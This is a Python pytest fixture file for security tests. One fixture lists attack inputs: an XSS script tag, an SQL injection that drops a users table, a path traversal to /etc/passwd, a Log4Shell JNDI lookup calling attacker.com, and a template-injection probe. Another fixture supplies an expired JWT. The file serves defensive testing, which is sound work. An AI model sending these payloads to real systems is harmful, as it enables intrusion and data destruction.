"""
Fixtures specific to security tests.

Security tests focus on authentication, authorization, and security controls.
Global fixtures from the parent conftest.py are automatically available.
"""
import pytest


@pytest.fixture
def malicious_inputs():
    """Collection of malicious inputs for security testing."""
    return [
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "../../../etc/passwd",
        "${jndi:ldap://attacker.com/a}",
        "{{7*7}}",  # SSTI
    ]


@pytest.fixture
def expired_token():
    """An expired JWT token for testing."""
    return "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0QGV4YW1wbGUuY29tIiwiZXhwIjoxfQ.invalid"
